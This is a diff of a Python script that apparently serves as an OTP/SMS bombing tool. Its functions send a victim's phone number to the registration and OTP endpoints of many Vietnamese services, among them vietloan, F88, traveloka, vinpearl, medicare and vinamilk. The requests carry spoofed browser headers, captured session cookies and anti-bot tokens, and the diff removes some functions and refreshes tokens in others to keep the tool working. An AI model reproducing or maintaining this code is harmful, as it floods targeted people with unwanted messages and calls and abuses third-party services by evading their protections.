-        'utm_uid': 'eyJpdiI6IkZSSFZ1Y25QeDUyV3VSMTVoWDZtTkE9PSIsInZhbHVlIjoiRHNxL0MrVC80aDI5dUxtcVU0UmR3ZE4rajFRd0I4STVXVVlBQURubWN4Qlk1Tm1idGJJWGNDTCtYTGVjdlYzVGxNLzBVbW9GYi9mZDQ4S09ZTkk0Q0dUNWE5cU90cm5jWWNGV3JYOEpuSFRoeC93cDhkUnVSaEswRUpyNWVheDAiLCJtYWMiOiIyODMwZDlkOGE1ZTI1ZTNiNjJmYjlmZDY2MTBmYmZiYzA4ZWMwYTYxN2JhMGY0NTk2ZWU4ZWE4Y2JiYWFlNDRlIiwidGFnIjoiIn0%3D',
-        'ec_cache_utm': '65518847-15fb-c698-6901-aae49c28ed93',
-        'ec_cache_client': 'false',
-        'ec_cache_client_utm': 'null',
-        'ec_png_utm': '65518847-15fb-c698-6901-aae49c28ed93',
-        'ec_png_client': 'false',
-        'ec_png_client_utm': 'null',
-        'ec_etag_client': 'false',
-        'ec_etag_utm': '65518847-15fb-c698-6901-aae49c28ed93',
-        'ec_etag_client_utm': 'null',
-        'uid': '65518847-15fb-c698-6901-aae49c28ed93',
-        'client': 'false',
-        'client_utm': 'null',
-    }
-
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': '__cfruid=05dded470380675f852d37a751c7becbfec7f394-1722345991; XSRF-TOKEN=eyJpdiI6IittWVVUb1dUNFNMRUtKRiswaDhITHc9PSIsInZhbHVlIjoiVTNWSU9vdTdJYndFZlM1UFo4enlQMzRCeENSWXRwNjgwT1NtWEdOSVNuNmNBZkxTMnUyRUJ1dytNSlVJVjZKS0o1V1FRQS81L2xFN0NOdGkvQitnL2xScjlGd3FBSXNBaUQ5ekdOTHBMMjY2b0tsZlI0OFZRdW9BWjgvd3V6blgiLCJtYWMiOiJhNzQwNzY5ZmY1YzZmNzMzYWFmOWM5YjVjYjFkYjA2MzJkYWIyNjVlOGViY2U2NGQxOGFiZWI4MGQ3NGI1Nzk1IiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IjBmbkMwd0JZenpMMnN2eDJiMmZjdGc9PSIsInZhbHVlIjoiTjl6U0NmZ213cjV1MG9VZEZhVHFkK2JDLzNiL1paaTR6dXhCM085a0gzTWhuSjhhUnhMNTNhb0wrNGtqM2U1OHF6UWNOMS9RcUxPWVdHR1NyUmt6OWtzcEVVd25DM3RiUUhOZWlXYTBiOG4rY0tKTUMrZGhHMGJPTlVqaDM1ME0iLCJtYWMiOiI2ZDcwNTQ5Mjg5M2Q0ZjYyOGQxOGJlZmQxZjEwYjY5NmY5ZTU5MTM1YjUzNGYzMDk3YmUyMTQ4YTcyNGE2OWFmIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IkZSSFZ1Y25QeDUyV3VSMTVoWDZtTkE9PSIsInZhbHVlIjoiRHNxL0MrVC80aDI5dUxtcVU0UmR3ZE4rajFRd0I4STVXVVlBQURubWN4Qlk1Tm1idGJJWGNDTCtYTGVjdlYzVGxNLzBVbW9GYi9mZDQ4S09ZTkk0Q0dUNWE5cU90cm5jWWNGV3JYOEpuSFRoeC93cDhkUnVSaEswRUpyNWVheDAiLCJtYWMiOiIyODMwZDlkOGE1ZTI1ZTNiNjJmYjlmZDY2MTBmYmZiYzA4ZWMwYTYxN2JhMGY0NTk2ZWU4ZWE4Y2JiYWFlNDRlIiwidGFnIjoiIn0%3D; ec_cache_utm=65518847-15fb-c698-6901-aae49c28ed93; ec_cache_client=false; ec_cache_client_utm=null; ec_png_utm=65518847-15fb-c698-6901-aae49c28ed93; ec_png_client=false; ec_png_client_utm=null; ec_etag_client=false; ec_etag_utm=65518847-15fb-c698-6901-aae49c28ed93; ec_etag_client_utm=null; uid=65518847-15fb-c698-6901-aae49c28ed93; client=false; client_utm=null',
-        'dnt': '1',
-        'origin': 'https://vietloan.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://vietloan.vn/register',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data = {
-        'phone': sdt,
-        '_token': 'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi',
-    }
-
-    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
-
-    print("OTP SEND vietloan:", response.text)
-
-
 def send_otp_via_lozi(sdt):
     headers = {
         'accept': '*/*',
@@ -973,44 +759,6 @@ def send_otp_via_lozi(sdt):
     response = requests.post('https://mocha.lozi.vn/v1/invites/use-app', headers=headers, json=json_data)
 
     print("OTP SEND lozi:", response.text)
-
-
-
-def send_otp_via_F88(sdt):
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-        'content-type': 'application/json',
-        'dnt': '1',
-        'origin': 'https://f88.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://f88.vn/',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-    }
-
-    json_data = {
-        'FullName': generate_random_name(),
-        'Phone': sdt,
-        'DistrictCode': '024',
-        'ProvinceCode': '02',
-        'AssetType': 'Car',
-        'IsChoose': '1',
-        'ShopCode': '',
-        'Url': 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan',
-        'FormType': 1,
-    }
-
-    response = requests.post('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', headers=headers, json=json_data)
-    print("OTP SEND F88:", response.text)
-
-
-
 
 def send_otp_via_spacet(sdt):
     cookies = {
@@ -1084,41 +832,20 @@ def send_otp_via_vinpearl(sdt):
     }
 
     headers = {
-        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
-        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-        # 'cookie': '__cf_bm=ozzzAEX1uTCa7awrOv_GXKhnlTZ.dm.uvhTIDit6bhM-1722350965-1.0.1.1-hRS2BvNDYVekVNF8Fdj8xDXMw.dMgIn6.pD0cFCg469YWi9TKE9tR4c1d9_o06p1l1b4TCJN_nULYx8ffAfWTw; __cfruid=3f11778af16256a63eb265af0f726daceeb866de-1722350965',
-        'dnt': '1',
-        'priority': 'i',
-        'referer': 'https://booking.vinpearl.com/vi/login-vpt?callback=vinpearl.com/auth0/sso?redirectUrl=https://vinpearl.com/vi/bo-tui-16-dia-diem-du-lich-ha-long-lam-say-long-du-khach',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'image',
-        'sec-fetch-mode': 'no-cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-    }
-
-    response = requests.get('https://booking.vinpearl.com/static/media/otp_lock.26ac1e3e.svg', cookies=cookies, headers=headers)
-
-
-    headers = {
         'accept': 'application/json',
         'accept-language': 'vi-VN',
         'access-control-allow-headers': 'Accept, X-Requested-With, Content-Type, Authorization, Access-Control-Allow-Headers',
-        'authorization': 'Bearer undefined',
         'content-type': 'application/json',
-        'dnt': '1',
         'origin': 'https://booking.vinpearl.com',
         'priority': 'u=1, i',
         'referer': 'https://booking.vinpearl.com/',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
+        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
         'x-display-currency': 'VND',
     }
 
@@ -1136,54 +863,6 @@ def send_otp_via_vinpearl(sdt):
     )
 
     print("OTP SEND vinpearl:", response.text)
-
-
-def send_otp_via_traveloka(sdt):
-    # Kiá»ƒm tra vÃ&nbsp; chuyá»ƒn Ä‘á»•i sá»‘ Ä‘iá»‡n thoáº¡i
-    if sdt.startswith('09'):
-        sdt = '+84' + sdt[1:]
-
-    cookies = {
-        'tv-repeat-visit': 'true',
-        'countryCode': 'VN',
-        'tv_user': '{"authorizationLevel":100,"id":null}',
-        'aws-waf-token': '98d9a3ce-74ae-4c55-9bc7-7f7bfd38eb33:AAoAv+Nn46QoAAAA:gvxS6OK/WD3sgvZHozCEooVHTXFGAse4BHwX3duvO+1ES7UfgyxW6JHZw/k60EUGp/zHOcObgnYj0450R3SsunEzxE12r6B4nqNXb12qrlWT68DMtNKLE+LXTcI/ssNVkL0bTzMBfZy87typHsUqku8II9EBQ9+yrb4IwvRLQJ+dmRBmjBXZEV/Jnj6ME53ngtZW+cIk0vb0tOi38a7mSK9uZw==',
-        'tvl': 'Pp2fiNmPN9ehu7LHMwNpGSSbQ0zEW8yNJGNrzEA+b5Tu/0QLSpEb9I15NcVASi6xJr7DpGrOW4FLV8SlNNIS5eciWJ9DfTh0Rbclt/MUEHKt6Liu/yDwgdnfnNkZKsVz21+N16DTS1sA51j3T1hUeUkdZnQ4Fql7MYzqG7/ae3YyBZr5Ks3dvYv7j7osaueb96QnQa/Hzd7of7MTXYnzZbl0A9Yi9G3pWvWsmPXbQonHXb1qNRSCi5KVUWjjYHkcHvCLnDOGI3o=~djAy',
-        'tvs': 'kOOPm9nR1+er1b8TFCAUgDLEIZ3VFBFIPFWJkFnDJ4stbii+OyDY47kN6Azp58gWhUyymih08uHGt5lhT4PvuwxDSvjXKwvZ/02k2VjAe65GOakasngrQF4EGjnnw3DDuoETUig5QjfQDfgEftAjG85pM6p6TvSU31SizW/I9caAmXpcw3LUVuyTt78y12sZZpeW+OUayg==~djAy',
-        '_dd_s': 'rum=0&amp;expire=1722352252222&amp;logs=1&amp;id=a1a90fe7-fce8-48b0-9100-5f789ab941af&amp;created=1722351314461',
-    }
-
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-        'content-type': 'application/json',
-        'dnt': '1',
-        'origin': 'https://www.traveloka.com',
-        'priority': 'u=1, i',
-        'referer': 'https://www.traveloka.com/vi-vn/explore/destination/kinh-nghiem-du-lich-ha-long-acc/148029',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-        'x-domain': 'user',
-        'x-route-prefix': 'vi-vn',
-    }
-
-    json_data = {
-        'fields': [],
-        'data': {
-            'userLoginMethod': 'PN',
-            'username': sdt,
-        },
-        'clientInterface': 'desktop',
-    }
-
-    response = requests.post('https://www.traveloka.com/api/v2/user/signup', cookies=cookies, headers=headers, json=json_data)
-    print("OTP SEND traveloka:", response.text)
-
 
 
 def send_otp_via_dongplus(sdt):
@@ -1615,87 +1294,6 @@ def send_otp_via_popeyes(sdt):
     print("OTP SEND popeyes:", response.text)
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-def send_otp_via_ACHECKIN(sdt):
-    # Request 1
-    url1 = "https://codepush.appcenter.ms/v0.1/public/codepush/update_check"
-
-    params1 = {
-    'deployment_key': "NyrEQrG2NR2IzdRgbTsfQZV-ZK7h_tsz8BjMd",
-    'app_version': "1.5",
-    'package_hash': "d2673f8362359fe9129b908e7fd445482becea4d3220ed385d58cae33c7e0391",
-    'label': "v39",
-    'client_unique_id': generate_random_id()
-    }
-
-    headers1 = {
-    'User-Agent': "AppotaHome/29 CFNetwork/1474 Darwin/23.0.0",
-    'Accept': "application/json",
-    'Content-Type': "application/json",
-    'x-codepush-plugin-version': "5.7.0",
-    'x-codepush-sdk-version': "^3.0.1",
-    'Accept-Language': "vi-VN,vi;q=0.9",
-    'x-codepush-plugin-name': "react-native-code-push"
-    }
-
-    response1 = requests.get(url1, params=params1, headers=headers1)
-    print("Response ACHECKIN 1:", response1.text)
-
-    # Request 2
-    url2 = "https://id.acheckin.vn/api/graphql/v2/mobile"
-
-    payload2 = json.dumps({
-    "operationName": "IdCheckPhoneNumber",
-    "variables": {
-        "phone_number": sdt
-    },
-    "query": "query IdCheckPhoneNumber($phone_number: String!) {\n  mutation: checkPhoneNumber(phone_number: $phone_number)\n}\n"
-    })
-
-    headers2 = {
-    'User-Agent': "AppotaHome/29 CFNetwork/1474 Darwin/23.0.0",
-    'Content-Type': "application/json",
-    'accept-language': "vi-VN,vi;q=0.9",
-    'authorization': "undefined"
-    }
-
-    response2 = requests.post(url2, data=payload2, headers=headers2)
-    print("Response ACHECKIN 2:", response2.text)
-
-    # Request 3
-    payload3 = json.dumps({
-    "operationName": "RequestVoiceOTP",
-    "variables": {
-        "phone_number": sdt,
-        "action": "REGISTER",
-        "hash": "6af5e4ed78ee57fe21f0d405c752798f"
-    },
-    "query": "mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) {\n  requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash)\n}\n"
-    })
-
-    response3 = requests.post(url2, data=payload3, headers=headers2)
-    print("Response ACHECKIN 3:", response3.text)
-
-
-
-
-
-
-
 def send_otp_via_APPOTA(sdt):
 
 
@@ -2025,31 +1623,48 @@ def send_otp_via_BEAUTYBOX(sdt):
     print("OTP SEND BEAUTY BOX:", response.text)
 
 def send_otp_via_medicare(sdt):
+    cookies = {
+        'SERVER': 'nginx3',
+        '_gcl_au': '1.1.944006101.1775728466',
+        '_ga': 'GA1.1.2100310157.1775728467',
+        '_tt_enable_cookie': '1',
+        '_ttp': '01KNRTM74F3VH8H6WNBAYAD0JE_.tt.1',
+        'ttcsid_CQ7OHOJC77U39H8UVNFG': '1775728467089::UklczwJG_tIwNz9vX6z0.1.1775728467098.0',
+        'ttcsid': '1775728467090::C9J1urWDDGR68tSSVzm2.1.1775728467098.0::1.-3164.0::3407.5.1265.70::0.0.0',
+        'XSRF-TOKEN': 'eyJpdiI6IkVoeUpwbmR6RWJHMFdDV2hvOEtsRHc9PSIsInZhbHVlIjoieXd2anliUWczdWxoQmVON1p5V3B1bmVtMGszeDk5bU4vME8zTzFTTVU1WUExSHhXajdrM3Uyc0Y5UVNKUVJXaVFtNGpzSUMxeERyYitBRFdoNEllYU1XMVdMNjFkU3FOSDh6VnJpQnR5dWFiSjdhbVBwQzBqSDM4MHFFMHZDM3QiLCJtYWMiOiJiYTM0ODQxODY5ZmYxYTYwYTk1ZDRlOGVjNGMxZDdlMzFlMTRhZjljNzdhNDI4NzA1NDVhMWZkNGY0YWJlMTg4IiwidGFnIjoiIn0%3D',
+        'medicare_session': 'eyJpdiI6Ii9hWXRTSmVmVVNpRDJRVGJuVllNTFE9PSIsInZhbHVlIjoiYkxzS2I1Y1ZxdWlGNUVScVkxK09tUVFHSndHaXpUaExpM1NuQS9IS0ZkandGOW9nWHdBUFFFNzIwc09iUUpkVVZRUFNkd2FybS9ZWVBEQjFzWmN3bCs3dU9VcUdtd1R3eWFVNGZMdXp6SWFaOU1WVXhDUDZ5NklLZm1wY3h2MGQiLCJtYWMiOiJkZDAxNzVmMjJiNzAwNzdhYjc4NDkyNDU5NDlhN2FhMGVlOTc0YTI0ZGQwMjZiN2ViZDcyMzZjZTcwNmZkODZkIiwidGFnIjoiIn0%3D',
+        '_ga_CEMYNHNKQ2': 'GS2.1.s1775728466$o1$g0$t1775728470$j56$l0$h0',
+        '_ga_8DLTVS911W': 'GS2.1.s1775728466$o1$g0$t1775728470$j56$l0$h0',
+        '_ga_R7XKMTVGEW': 'GS2.1.s1775728466$o1$g0$t1775728470$j56$l0$h0',
+        '_ga_SSLZMTVB8K': 'GS2.1.s1775728466$o1$g1$t1775728470$j56$l0$h0',
+    }
+
     headers = {
         'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
+        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
         'Connection': 'keep-alive',
         'Content-Type': 'application/json',
-        # 'Cookie': 'SERVER=nginx2; XSRF-TOKEN=eyJpdiI6InhFOEozSXJqVEJxMEFURDEwMkd4c0E9PSIsInZhbHVlIjoiU0hFS0htQTJXMWg5cnJMWjdDRHUwS01RS3BOaVRIYmU5VzgySFJlNVp4TUhoazI1cDFDSS93TGZ4TjFQZ00wbHBFclVOejlTQmhvdW5CME9xSFNQV0x5KzNZc1Q4dlZkM0xUZUJicllwRkZQQUNUb0s0eVBmYlRmK280TkZsY3kiLCJtYWMiOiI1OGJlZDg1ZjJlNTQ1Y2Q0YTA2OTVhODJmYTQ0MDBmZWY3ZDY0MTcwMjFiOTg2MDJjYTc4MGFjNDY4ZWFlYzc5IiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6ImJ2NlA2U253YkQ0NXFoWXRtSVpYcHc9PSIsInZhbHVlIjoiUjk0N0k1cytwTzFqV3d6UjFwUUJOZ09HMTdDdTJzWTR2WSswblhFWkxhVTFiZVkyUTlHelN2Ympvb0VidVgrYUFnT0s3WkRCeTdDcmJMK2RtM1J3YUxBUm5aOUtvaUZ0R2lmMURBR2o3UUxLQTZ6ODBJVFNsTnN0NUNocHJVZ1QiLCJtYWMiOiI0ZTA4NTc0MjE2MGUzYTFiZWU2MjNhMmVkOTUzMWFiMWYxMDJjNTRiMmJiZmUyMzU1YmZjZTQxNTA2Zjc0Zjc2IiwidGFnIjoiIn0%3D',
-        'DNT': '1',
         'Origin': 'https://medicare.vn',
         'Referer': 'https://medicare.vn/login',
         'Sec-Fetch-Dest': 'empty',
         'Sec-Fetch-Mode': 'cors',
         'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-        'X-XSRF-TOKEN': 'eyJpdiI6InhFOEozSXJqVEJxMEFURDEwMkd4c0E9PSIsInZhbHVlIjoiU0hFS0htQTJXMWg5cnJMWjdDRHUwS01RS3BOaVRIYmU5VzgySFJlNVp4TUhoazI1cDFDSS93TGZ4TjFQZ00wbHBFclVOejlTQmhvdW5CME9xSFNQV0x5KzNZc1Q4dlZkM0xUZUJicllwRkZQQUNUb0s0eVBmYlRmK280TkZsY3kiLCJtYWMiOiI1OGJlZDg1ZjJlNTQ1Y2Q0YTA2OTVhODJmYTQ0MDBmZWY3ZDY0MTcwMjFiOTg2MDJjYTc4MGFjNDY4ZWFlYzc5IiwidGFnIjoiIn0=',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
+        'X-XSRF-TOKEN': 'eyJpdiI6IkVoeUpwbmR6RWJHMFdDV2hvOEtsRHc9PSIsInZhbHVlIjoieXd2anliUWczdWxoQmVON1p5V3B1bmVtMGszeDk5bU4vME8zTzFTTVU1WUExSHhXajdrM3Uyc0Y5UVNKUVJXaVFtNGpzSUMxeERyYitBRFdoNEllYU1XMVdMNjFkU3FOSDh6VnJpQnR5dWFiSjdhbVBwQzBqSDM4MHFFMHZDM3QiLCJtYWMiOiJiYTM0ODQxODY5ZmYxYTYwYTk1ZDRlOGVjNGMxZDdlMzFlMTRhZjljNzdhNDI4NzA1NDVhMWZkNGY0YWJlMTg4IiwidGFnIjoiIn0=',
+        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
+    # 'Cookie': 'SERVER=nginx3; _gcl_au=1.1.944006101.1775728466; _ga=GA1.1.2100310157.1775728467; _tt_enable_cookie=1; _ttp=01KNRTM74F3VH8H6WNBAYAD0JE_.tt.1; ttcsid_CQ7OHOJC77U39H8UVNFG=1775728467089::UklczwJG_tIwNz9vX6z0.1.1775728467098.0; ttcsid=1775728467090::C9J1urWDDGR68tSSVzm2.1.1775728467098.0::1.-3164.0::3407.5.1265.70::0.0.0; XSRF-TOKEN=eyJpdiI6IkVoeUpwbmR6RWJHMFdDV2hvOEtsRHc9PSIsInZhbHVlIjoieXd2anliUWczdWxoQmVON1p5V3B1bmVtMGszeDk5bU4vME8zTzFTTVU1WUExSHhXajdrM3Uyc0Y5UVNKUVJXaVFtNGpzSUMxeERyYitBRFdoNEllYU1XMVdMNjFkU3FOSDh6VnJpQnR5dWFiSjdhbVBwQzBqSDM4MHFFMHZDM3QiLCJtYWMiOiJiYTM0ODQxODY5ZmYxYTYwYTk1ZDRlOGVjNGMxZDdlMzFlMTRhZjljNzdhNDI4NzA1NDVhMWZkNGY0YWJlMTg4IiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6Ii9hWXRTSmVmVVNpRDJRVGJuVllNTFE9PSIsInZhbHVlIjoiYkxzS2I1Y1ZxdWlGNUVScVkxK09tUVFHSndHaXpUaExpM1NuQS9IS0ZkandGOW9nWHdBUFFFNzIwc09iUUpkVVZRUFNkd2FybS9ZWVBEQjFzWmN3bCs3dU9VcUdtd1R3eWFVNGZMdXp6SWFaOU1WVXhDUDZ5NklLZm1wY3h2MGQiLCJtYWMiOiJkZDAxNzVmMjJiNzAwNzdhYjc4NDkyNDU5NDlhN2FhMGVlOTc0YTI0ZGQwMjZiN2ViZDcyMzZjZTcwNmZkODZkIiwidGFnIjoiIn0%3D; _ga_CEMYNHNKQ2=GS2.1.s1775728466$o1$g0$t1775728470$j56$l0$h0; _ga_8DLTVS911W=GS2.1.s1775728466$o1$g0$t1775728470$j56$l0$h0; _ga_R7XKMTVGEW=GS2.1.s1775728466$o1$g0$t1775728470$j56$l0$h0; _ga_SSLZMTVB8K=GS2.1.s1775728466$o1$g1$t1775728470$j56$l0$h0',
     }
 
     json_data = {
         'mobile': sdt,
         'mobile_country_prefix': '84',
+        'token': '0cAFcWeA4Wy_i-qLEoGR39eXcS15JOvUy9ChP84L68Ylp0YryrIe4pZULq4jexdM8Z-RjLupuHGoRKcAYV5xGwN94-4ktm5rx5-o7MsqRIs-03l4xJ7Tf0XpXSldJqmGOsiYm8_oinLVa5ptRLdu-AVimBP-AqDH2iK6VkV41X3zVaX04E3jMisT7TOKdAsrqHBuMrs8Estl3nR7sYSYcFyjZodjrKlRb0HIjCqTncCEQ9toKnj-7HxDC7Gm3ThKGf9BMs4sgaQZttCT0gjHYxznJIBjWdzgwHlbkDss-BRPxLXQx05FDXJwYz3l6POENOY2o6AZW3bZXhPkRWQC_MMR7eMLP3lu6znKRwVJ7FgNI2UNE2qdYiCE6s1xJsCDL4YOn8_ZF9U1IODaP-jsTWiFMLh_QSJY8OwDfrfiwxrNillXYhu85jRNag0bAXPuhr--w5xxIk2MeTV27P8GSbShKGzNiZPzf8RUISnsELb3jDsFKfU7zbQs2vAzlhIrA7gozwPIdFUAwtklcG4atYKB4-9pRMhiwULdx5LiYGcvabsQ6dO9zLUtTSJ0h630SP6xbo-QP5lr8DNtkLg-9BAA8zhku5tw-0wJCLufOBkMd2XogAopdtIegLcYh2wCQhxPr5eenLgHuzW5CDbpfKlSoNNwZN6Olor1Dlbc6_zPvAuPOzcRrfwca_1kZ7C7nAC_sQX2mRrZ82iDIOgrDCvVzlEKdliiw43OvKaH9I4DFZtmhGAREHcUDxSN6TkKsDO3ElTC361ednHuW6PYvoJAqmReihvrumUR8aDnx0DhGEi9YRl3lAkD40wR9qmlvM3YoHcosXOEpul-ngWN1uE2G6HmCT0UILxhKfKCdncCLJ4wVBuI2VBi9lqzhbV4JXhBLEp420rSVkv5DctzFFa7W0F27uc1fq9OTya-ZgnkSUPakccGcSTX1ZS6hNByOXY5RjLbCGFgd6TK9JbUtXB8Pa39gTG1_B80UkYpkPgtgumN0ietWdWRFBKD_t5SHOWxDOKIqLaDcbYWqW9oaN0L-fTo74z_uLRcYFXxU4joqHHul3J9KkcT34ifEmDXYDe_p8cY8grTn-wNQYxtght3ERAzKhiD8bSGl_cKycOh8iyOqUKmjtv3Or6SMnw8ZZUaS_UDDHAMXG1UyR8H3CNnH6ojQ9A3JJV4rvMHa-bDpBGqMULtEmX-DdSL9V12dbvfqylmgJgT892gVs52hjkH9XRLEh9rMAx5hIRNERFnec0ySNSF6TFLt2bgZAeLZA0S6T2y4tFcRawdA1HvnKF04QR96XbxQQT0tHHfAecDA_h5L1TGkiK6Ofs7zyfk5FsMpddlp0AESgQnDHWHBfH0IQoJUEDFhQROJvU6ELn8_hjUKuHV1kaDUrLDEdYRBG7Gcd5-NKinNXHeygN7G62WoVQhcfYMw2GF6nUMfOOEqqMQSvGD6XSwz358kdJC3XyhO53lVRsYmcnMiW5pP90z6RKhUco597wFlXKGJJkgUTbpM760yFUnoyD0yn4bq7pvpGVOOxc4Ka0iNnBvDCAvDgoEPAkt-sIW5IKvkFAjn95-rMNC3Z0OeDi7_ut9B2XvjzCci8SKYdylzoXky16t0JEWX3J5uG14o5M7jQbEvlrC5OPnYDIerGNmrzyv4gl_HvhVXnmffvLvIC5fA9sNKgQAlNRJ018F1DOOr8qvtUiHpvCQXIsODDB7azyOcRXk43vIwknBSTC-SU_eYV4sNPDHPD31id8p00FQqSdMMkM7L_kx2nyX5A_Q-UmD3Bc19048l1Fn4X9lOrkxd7AJxjh6Uopk8zJrqIQUPpNzO2H3t_URuZNW81U_1_KQi1q_fuNvBOhCicKXaGTDFfUJ1J0P5Z98CgESIjPoGBeTiFI1cdYFz_PdzSs9tf5OcRS3dV-gljY9c_ErH4lXLYNLYjU0l2UVfEEzgg7z--zJu0DMSMbkxLYy-9Ys7Aaurukyvy1RT0wI0010wzMqj8YghccDQPJU-BJw7L672bmtotzRlboz-oKIqRL8Z7xKckCvjwGddzOPIfj4v008IEr8YIGIG7JJr3pZ6ivvGSRJ2gSbgzkMMPdYTTsqmdoDgmWgG16e5vT-VV9DxpeFHPbp6jz9y9qhcbK0OjdLloFlJHvR_Rq7vuplYEdRAL03Q8qHJFoqwppk-Q',
+        'client': 'web',
     }
 
-    response = requests.post('https://medicare.vn/api/otp', headers=headers, json=json_data)
+    response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
 
     print("OTP SEND medicare:", response.text)
 
@@ -2370,96 +1985,6 @@ def send_otp_via_vinamilk(sdt):
     response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', headers=headers, data=data)
     print("OTP SEND vinamilk:", response.text)
 
-
-def send_otp_via_vietloan2(sdt):
-    cookies = {
-    '_fbp': 'fb.1.1720102725444.358598086701375218',
-    '_gcl_au': '1.1.619229570.1720102726',
-    'mousestats_vi': 'acaa606972ae539932c0',
-    '_tt_enable_cookie': '1',
-    '_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
-    '_ym_uid': '1720102728534641572',
-    '_ym_d': '1720102728',
-    '_gid': 'GA1.2.557208002.1720622172',
-    '_clck': '14x7a16%7C2%7Cfnc%7C0%7C1646',
-    '_ym_isad': '2',
-    '__cfruid': '92805d7d62cc6333c3436c959ecc099040706b4f-1720628273',
-    '_ym_visorc': 'w',
-    'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
